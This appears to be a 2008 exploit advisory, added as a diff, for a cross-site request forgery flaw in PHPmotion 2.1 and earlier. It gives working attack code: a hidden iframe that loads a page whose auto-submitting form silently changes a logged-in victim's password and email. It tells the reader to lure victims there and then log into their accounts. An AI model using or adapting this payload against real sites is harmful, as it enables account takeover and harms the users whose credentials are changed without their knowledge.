@@ -1,0 +1,40 @@
+PHPmotion <= 2.1 CSRF vulnerability
+
+Author: Ausome1
+Email: Ausorme1@gmail.com
+Website: http://www.enigmagroup.org
+Description: Change a member's password and/or email.
+---------------------------------------------------------------------------------------------------
+
+
+Social engineer a PHPMotion member to come to your web page with the following hidden iframe on 
+there, which pulls in the evil script from pwned.html. This will change the victim's password and email, 
+using their credentials.
+
+We use a hidden iframe so the victim doesn't know their password was changed till it's to late. In 
+the pwned.html file I recreated the form on the PHPMotion change password/email. Javascript is used 
+to submit the form on page load.
+
+Hidden iframe code:
+
+	<iframe id="hiframe" style="visibility:hidden;display:none" src="pwned.html"></iframe>
+
+
+Source of pwned.html file:
+
+	<html>
+	<head></head>
+	<body onload="document.forms.invite.submit();">
+	<form name="invite" action="http://demo.phpmotiontemplates.com/v2/default/password.php" method="post" class="UpdateProfileForm">
+		<input type="hidden" name="submitted" value="yes" />
+		<input type="password" name="password" value="password123" />
+		<input type="text" name="email_address" size="36" value="NotYourEmail@anymore.com" />
+		<input type="submit" value="Update settings" name="invite_fr" />
+	</form>
+	</html>
+
+
+Once your victim has visited your evil page, You may now be able to log into their PHPMotion account, 
+using password "password123" and their email will be "NotYourEmail@anymore.com".
+
+# milw0rm.com [2008-12-23]
